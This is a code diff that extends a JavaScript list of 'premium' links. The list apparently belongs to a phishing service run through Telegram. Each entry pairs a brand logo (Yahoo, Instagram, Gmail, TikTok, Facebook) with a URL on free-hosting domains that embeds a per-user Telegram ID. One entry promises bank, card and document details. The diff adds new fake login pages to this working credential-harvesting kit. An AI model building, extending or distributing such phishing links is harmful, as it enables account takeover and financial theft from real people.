@@ -1,5 +1,7 @@
 const premiumLinks = [ 
 { name: "Full Banks | Cards | Documents details", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRljYR5iTAkiZtuAvJ6idi59ktv81bzEMYJl_I38zgN94rISNtL2e4k0Ics&s=10", urlTemplate: "https://nexusggvet.xo.je/nexus/nexus.html?id={telegram-id}" },
+{name:"Yahoo Login",      image:"https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png",urlTemplate:"https://tonilop.ct.ws/nn/y.html?id={telegram-id}"},
+  {name:"Instagram",        image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10",urlTemplate:"https://tonilop.ct.ws/nn/i.html?id={telegram-id}"},
 {name:"Gmail",            image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s",urlTemplate:"https://tonilop.ct.ws/nn/g.html?id={telegram-id}"},
   {name:"TikTok",           image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s",urlTemplate:"https://tonilop.ct.ws/nn/t.html?id={telegram-id}"},
   {name:"Facebook Vote",    image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10",urlTemplate:"https://knlok.xo.je/sc/cv/cf.html?id={telegram-id}"},
